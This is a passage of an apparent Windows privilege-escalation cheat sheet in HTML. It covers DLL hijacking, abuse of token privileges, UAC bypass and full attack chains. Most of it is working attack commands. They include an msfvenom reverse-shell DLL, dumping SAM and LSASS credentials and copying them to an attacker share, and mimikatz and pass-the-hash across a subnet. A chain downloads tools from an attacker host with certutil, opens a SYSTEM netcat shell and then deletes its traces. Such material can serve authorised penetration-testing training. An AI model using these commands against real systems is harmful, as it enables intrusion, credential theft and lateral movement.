+<div class="language-powershell highlight"><span class="filename">Detect + exploit DLL hijacking</span><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c"># Process Monitor (procmon64.exe) is the gold standard. Filter on:</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="c">#   Operation = CreateFile</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="c">#   Path ends with .dll</span>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="c">#   Result = NAME NOT FOUND or PATH NOT FOUND</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="c"># Each NAME-NOT-FOUND in a writable directory is a hijack candidate.</span>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="c"># PowerUp finds the simple cases automatically</span>
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="nb">Find-PathDLLHijack</span>       <span class="c"># writable dirs in $env:PATH</span>
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="nb">Find-ProcessDLLHijack</span>    <span class="c"># running process DLL search paths</span>
+</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>
+</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a><span class="c"># Quick CLI version: dirs in PATH that you can write to</span>
+</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a><span class="nv">$env:PATH</span> <span class="n">-split</span> <span class="s1">&#39;;&#39;</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="nv">$_</span><span class="p">)</span> <span class="p">{</span> <span class="n">icacls</span> <span class="nv">$_</span> <span class="n">2</span><span class="p">&gt;</span><span class="nv">$null</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="s1">&#39;Everyone|Authenticated Users|BUILTIN\\Users&#39;</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span> <span class="s2">&quot;$_</span><span class="se">`t</span><span class="s2">&lt;= </span><span class="p">$(</span><span class="nv">$_</span><span class="p">)</span><span class="s2">&quot;</span> <span class="p">}</span> <span class="p">}</span> <span class="p">}</span>
+</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a>
+</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a><span class="c"># Generate a payload DLL</span>
+</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">x64</span><span class="p">/</span><span class="n">shell_reverse_tcp</span> <span class="n">LHOST</span><span class="p">=&lt;</span><span class="n">ATTACKER</span><span class="p">&gt;</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">4444</span> <span class="o">-f</span> <span class="n">dll</span> <span class="n">-o</span> <span class="n">evil</span><span class="p">.</span><span class="n">dll</span>
+</span><span id="__span-10-17"><a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a>
+</span><span id="__span-10-18"><a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a><span class="c"># Drop it in the writable path with the expected name (e.g., VERSION.dll, DWMAPI.dll)</span>
+</span><span id="__span-10-19"><a id="__codelineno-10-19" name="__codelineno-10-19" href="#__codelineno-10-19"></a><span class="nb">copy </span><span class="n">evil</span><span class="p">.</span><span class="n">dll</span> <span class="s2">&quot;C:\writable\path\VERSION.dll&quot;</span>
+</span><span id="__span-10-20"><a id="__codelineno-10-20" name="__codelineno-10-20" href="#__codelineno-10-20"></a>
+</span><span id="__span-10-21"><a id="__codelineno-10-21" name="__codelineno-10-21" href="#__codelineno-10-21"></a><span class="c"># Wait for the privileged process to load it (next service start, scheduled task, login)</span>
+</span></code></pre></div>
+<h3 id="123-other-privileges-worth-knowing">12.3 · Other privileges worth knowing<a class="headerlink" href="#123-other-privileges-worth-knowing" title="Permanent link">¶</a></h3>
+<div class="admonition info">
+<p class="admonition-title">When <code>whoami /priv</code> shows something exotic</p>
+<table>
+<thead>
+<tr>
+<th>Privilege</th>
+<th>What it gets you</th>
+<th>Exploit</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>SeImpersonatePrivilege</code></td>
+<td>SYSTEM via Potato</td>
+<td>#12.1</td>
+</tr>
+<tr>
+<td><code>SeAssignPrimaryTokenPrivilege</code></td>
+<td>Same as SeImpersonate (use a Potato)</td>
+<td>#12.1</td>
+</tr>
+<tr>
+<td><code>SeBackupPrivilege</code></td>
+<td>Read <strong>any</strong> file (incl. <code>\Windows\System32\config\SAM</code>, <code>SYSTEM</code>)</td>
+<td><code>reg save HKLM\SAM sam.hive</code></td>
+</tr>
+<tr>
+<td><code>SeRestorePrivilege</code></td>
+<td>Write <strong>any</strong> file; replace service binaries</td>
+<td>Pair with SeBackup for full read/write</td>
+</tr>
+<tr>
+<td><code>SeTakeOwnershipPrivilege</code></td>
+<td>Take ownership of any object → grant yourself rights</td>
+<td><code>takeown /f &lt;file&gt;</code> then <code>icacls /grant</code></td>
+</tr>
+<tr>
+<td><code>SeDebugPrivilege</code></td>
+<td>Open any process token; LSASS dump</td>
+<td><code>procdump -accepteula -ma lsass lsass.dmp</code> then mimikatz offline</td>
+</tr>
+<tr>
+<td><code>SeLoadDriverPrivilege</code></td>
+<td>Load a signed-but-vulnerable driver → kernel exec</td>
+<td>Capcom.sys / <code>EOPLOADDRIVER</code></td>
+</tr>
+<tr>
+<td><code>SeManageVolumePrivilege</code></td>
+<td>Trigger SYSTEM-level operations via Volume Shadow</td>
+<td>Specific exploits exist</td>
+</tr>
+<tr>
+<td><code>SeTcbPrivilege</code></td>
+<td>"Act as part of the OS" — practically SYSTEM-equivalent</td>
+<td>Direct token manipulation</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div class="language-powershell highlight"><span class="filename">SeBackupPrivilege → SAM/SYSTEM dump → local admin hash</span><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c"># Confirm</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="n">Backup</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="c"># Save the registry hives (works because SeBackup bypasses the file ACLs)</span>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SAM</span>   <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">sam</span><span class="p">.</span><span class="n">hive</span>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SYSTEM</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">system</span><span class="p">.</span><span class="n">hive</span>
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SECURITY</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">security</span><span class="p">.</span><span class="n">hive</span>  <span class="c"># cached domain creds + LSA secrets</span>
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="c"># Exfil</span>
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="nb">copy </span><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\*.</span><span class="n">hive</span> <span class="p">\\&lt;</span><span class="n">ATTACKER</span><span class="p">&gt;\</span><span class="n">share</span><span class="p">\</span>
+</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>
+</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a><span class="c"># Offline: extract hashes</span>
+</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a><span class="n">impacket-secretsdump</span> <span class="n">-sam</span> <span class="n">sam</span><span class="p">.</span><span class="n">hive</span> <span class="n">-system</span> <span class="n">system</span><span class="p">.</span><span class="n">hive</span> <span class="n">-security</span> <span class="n">security</span><span class="p">.</span><span class="n">hive</span> <span class="n">LOCAL</span>
+</span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a>
+</span><span id="__span-11-15"><a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a><span class="c"># → local Administrator NTLM hash. Pass-the-Hash to anywhere this machine&#39;s</span>
+</span><span id="__span-11-16"><a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a><span class="c"># local admin is reused (very common in lazy-imaging environments)</span>
+</span><span id="__span-11-17"><a id="__codelineno-11-17" name="__codelineno-11-17" href="#__codelineno-11-17"></a><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="p">&lt;</span><span class="n">SUBNET</span><span class="p">&gt;/</span><span class="n">24</span> <span class="n">-u</span> <span class="n">Administrator</span> <span class="n">-H</span> <span class="p">&lt;</span><span class="n">NTHASH</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-local-auth</span>
+</span></code></pre></div>
+<div class="language-powershell highlight"><span class="filename">SeDebugPrivilege → LSASS dump → domain creds</span><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c"># Confirm (often paired with elevated admin token, but not always)</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="n">Debug</span>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="c"># Dump LSASS (procdump from Sysinternals is signed → less likely to alert)</span>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="n">procdump</span><span class="p">.</span><span class="n">exe</span> <span class="n">-accepteula</span> <span class="n">-ma</span> <span class="n">lsass</span><span class="p">.</span><span class="n">exe</span> <span class="n">lsass</span><span class="p">.</span><span class="n">dmp</span>
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="c"># Alternatives that avoid the LSASS handle pattern (more EDR-friendly)</span>
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="c"># - comsvcs.dll MiniDump (built-in)</span>
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="n">rundll32</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">comsvcs</span><span class="p">.</span><span class="n">dll</span><span class="p">,</span><span class="n">MiniDump</span> <span class="p">&lt;</span><span class="n">LSASS_PID</span><span class="p">&gt;</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">lsass</span><span class="p">.</span><span class="n">dmp</span> <span class="n">full</span>
+</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="c"># - nanodump (avoids dbghelp signatures)</span>
+</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a><span class="n">nanodump</span><span class="p">.</span><span class="n">exe</span> <span class="n">-w</span> <span class="n">lsass</span><span class="p">.</span><span class="n">dmp</span>
+</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>
+</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a><span class="c"># Offline: parse with mimikatz on attacker box</span>
+</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a><span class="n">mimikatz</span> <span class="c"># sekurlsa::minidump lsass.dmp</span>
+</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a><span class="n">mimikatz</span> <span class="c"># sekurlsa::logonpasswords</span>
+</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a><span class="c"># → cleartext passwords (Win &lt; 8.1 or WDigest enabled), NT hashes, Kerberos tickets</span>
+</span></code></pre></div>
+<div class="language-powershell highlight"><span class="filename">SeTakeOwnership + SeRestore → arbitrary file write</span><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c"># Take ownership of a file you couldn&#39;t otherwise touch</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="n">takeown</span> <span class="p">/</span><span class="n">f</span> <span class="n">C</span><span class="p">:\</span><span class="n">path</span><span class="p">\</span><span class="n">to</span><span class="p">\</span><span class="n">protected</span><span class="p">.</span><span class="n">dll</span>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="n">icacls</span> <span class="n">C</span><span class="p">:\</span><span class="n">path</span><span class="p">\</span><span class="n">to</span><span class="p">\</span><span class="n">protected</span><span class="p">.</span><span class="n">dll</span> <span class="p">/</span><span class="n">grant</span> <span class="p">&lt;</span><span class="n">user</span><span class="p">&gt;:</span><span class="n">F</span>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="c"># Replace a service binary with your payload</span>
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="nb">copy </span><span class="n">evil</span><span class="p">.</span><span class="n">dll</span> <span class="n">C</span><span class="p">:\</span><span class="n">path</span><span class="p">\</span><span class="n">to</span><span class="p">\</span><span class="n">protected</span><span class="p">.</span><span class="n">dll</span>
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="c"># Restart service or wait for reboot</span>
+</span></code></pre></div>
+<h3 id="124-uac-bypass-admin-but-filtered-full-admin-token">12.4 · UAC bypass (admin-but-filtered → full admin token)<a class="headerlink" href="#124-uac-bypass-admin-but-filtered-full-admin-token" title="Permanent link">¶</a></h3>
+<div class="admonition info">
+<p class="admonition-title">When <code>whoami /groups</code> shows BUILTIN\Administrators but commands fail</p>
+<p>Standard medium-integrity admins have a filtered token. UAC bypasses elevate to high-integrity without prompting. Useful when you have admin creds but no GUI to click "Yes" on.</p>
+</div>
+<div class="language-powershell highlight"><span class="filename">UAC bypass quick reference</span><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c"># Confirm you&#39;re in the filtered state</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">groups</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="s2">&quot;high\|medium&quot;</span>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="c"># Medium Mandatory Level → filtered. High → already elevated.</span>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="c"># fodhelper.exe (registry-based, simple, signatured)</span>
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="n">reg</span> <span class="n">add</span> <span class="s2">&quot;HKCU\Software\Classes\ms-settings\Shell\Open\command&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&quot;DelegateExecute&quot;</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="p">/</span><span class="n">d</span> <span class="s2">&quot;&quot;</span> <span class="p">/</span><span class="n">f</span>
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="n">reg</span> <span class="n">add</span> <span class="s2">&quot;HKCU\Software\Classes\ms-settings\Shell\Open\command&quot;</span> <span class="p">/</span><span class="n">ve</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="p">/</span><span class="n">d</span> <span class="s2">&quot;cmd.exe /c start cmd.exe&quot;</span> <span class="p">/</span><span class="n">f</span>
+</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="n">fodhelper</span><span class="p">.</span><span class="n">exe</span>
+</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="n">reg</span> <span class="n">delete</span> <span class="s2">&quot;HKCU\Software\Classes\ms-settings&quot;</span> <span class="p">/</span><span class="n">f</span>
+</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a>
+</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a><span class="c"># computerdefaults.exe (similar pattern)</span>
+</span><span id="__span-14-12"><a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a><span class="c"># eventvwr.exe (older, often patched)</span>
+</span><span id="__span-14-13"><a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a>
+</span><span id="__span-14-14"><a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a><span class="c"># UACME (compendium of bypasses, pick a method by number)</span>
+</span><span id="__span-14-15"><a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a><span class="p">.\</span><span class="n">Akagi</span><span class="p">.</span><span class="n">exe</span> <span class="n">23</span> <span class="n">cmd</span><span class="p">.</span><span class="n">exe</span>   <span class="c"># method 23 = fodhelper variant</span>
+</span><span id="__span-14-16"><a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a><span class="p">.\</span><span class="n">Akagi</span><span class="p">.</span><span class="n">exe</span> <span class="n">41</span> <span class="n">cmd</span><span class="p">.</span><span class="n">exe</span>   <span class="c"># method 41 = ICMLuaUtil</span>
+</span><span id="__span-14-17"><a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a>
+</span><span id="__span-14-18"><a id="__codelineno-14-18" name="__codelineno-14-18" href="#__codelineno-14-18"></a><span class="c"># PowerShell-friendly: bypass-uac module, Invoke-PsUACme</span>
+</span><span id="__span-14-19"><a id="__codelineno-14-19" name="__codelineno-14-19" href="#__codelineno-14-19"></a>
+</span><span id="__span-14-20"><a id="__codelineno-14-20" name="__codelineno-14-20" href="#__codelineno-14-20"></a><span class="c"># After bypass, verify</span>
+</span><span id="__span-14-21"><a id="__codelineno-14-21" name="__codelineno-14-21" href="#__codelineno-14-21"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">groups</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="s2">&quot;high&quot;</span>
+</span><span id="__span-14-22"><a id="__codelineno-14-22" name="__codelineno-14-22" href="#__codelineno-14-22"></a><span class="c"># → Mandatory Label\High Mandatory Level</span>
+</span></code></pre></div>
+<h3 id="125-worked-end-to-end-chains">12.5 · Worked end-to-end chains<a class="headerlink" href="#125-worked-end-to-end-chains" title="Permanent link">¶</a></h3>
+<div class="admonition example">
+<p class="admonition-title">Chain A: Webshell → IIS appool → SYSTEM → domain creds</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c"># 1) Webshell as iis apppool\DefaultAppPool</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="n">whoami</span>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="c"># iis apppool\defaultapppool</span>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="c"># 2) Triage</span>
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="c"># SeImpersonatePrivilege Enabled</span>
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="n">systeminfo</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="s2">&quot;OS Name OS Version&quot;</span>
+</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a><span class="c"># Windows Server 2019 Standard</span>
+</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>
+</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a><span class="c"># 3) Stage GodPotato + nc</span>
+</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a><span class="n">certutil</span> <span class="n">-urlcache</span> <span class="n">-split</span> <span class="o">-f</span> <span class="n">http</span><span class="p">://&lt;</span><span class="n">ATTACKER</span><span class="p">&gt;/</span><span class="n">gp</span><span class="p">.</span><span class="n">exe</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">gp</span><span class="p">.</span><span class="n">exe</span>
+</span><span id="__span-15-14"><a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a><span class="n">certutil</span> <span class="n">-urlcache</span> <span class="n">-split</span> <span class="o">-f</span> <span class="n">http</span><span class="p">://&lt;</span><span class="n">ATTACKER</span><span class="p">&gt;/</span><span class="n">nc</span><span class="p">.</span><span class="n">exe</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">nc</span><span class="p">.</span><span class="n">exe</span>
+</span><span id="__span-15-15"><a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a>
+</span><span id="__span-15-16"><a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a><span class="c"># 4) SYSTEM reverse shell</span>
+</span><span id="__span-15-17"><a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">gp</span><span class="p">.</span><span class="n">exe</span> <span class="n">-cmd</span> <span class="s2">&quot;C:\Windows\Temp\nc.exe &lt;ATTACKER&gt; 4444 -e cmd.exe&quot;</span>
+</span><span id="__span-15-18"><a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a>
+</span><span id="__span-15-19"><a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a><span class="c"># 5) On the SYSTEM shell: dump LSASS for domain creds</span>
+</span><span id="__span-15-20"><a id="__codelineno-15-20" name="__codelineno-15-20" href="#__codelineno-15-20"></a><span class="n">rundll32</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">comsvcs</span><span class="p">.</span><span class="n">dll</span><span class="p">,</span><span class="n">MiniDump</span> <span class="p">(</span><span class="nb">Get-Process</span> <span class="n">lsass</span><span class="p">).</span><span class="n">Id</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">lsass</span><span class="p">.</span><span class="n">dmp</span> <span class="n">full</span>
+</span><span id="__span-15-21"><a id="__codelineno-15-21" name="__codelineno-15-21" href="#__codelineno-15-21"></a><span class="c"># Exfil + parse offline with mimikatz</span>
+</span><span id="__span-15-22"><a id="__codelineno-15-22" name="__codelineno-15-22" href="#__codelineno-15-22"></a>
+</span><span id="__span-15-23"><a id="__codelineno-15-23" name="__codelineno-15-23" href="#__codelineno-15-23"></a><span class="c"># 6) Cleanup</span>
+</span><span id="__span-15-24"><a id="__codelineno-15-24" name="__codelineno-15-24" href="#__codelineno-15-24"></a><span class="nb">del </span><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">gp</span><span class="p">.</span><span class="n">exe</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">nc</span><span class="p">.</span><span class="n">exe</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">lsass</span><span class="p">.</span><span class="n">dmp</span>
+</span></code></pre></div>
+</div>
+<div class="admonition example">
+<p class="admonition-title">Chain B: Standard domain user → unquoted service → SYSTEM → cmdkey loot</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="c"># 1) Foothold via RDP/WinRM as domain\bob (no special privs)</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="c"># Nothing useful</span>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="c"># 2) Run winpeas</span>
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="p">.\</span><span class="n">winPEASx64</span><span class="p">.</span><span class="n">exe</span> <span class="n">quiet</span> <span class="n">servicesinfo</span>
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="c"># → Unquoted Service Path: VulnSvc, C:\Program Files\Vendor App\svc.exe</span>
+</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a><span class="c"># → BUILTIN\Users has Modify on C:\Program Files\Vendor App</span>
+</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>
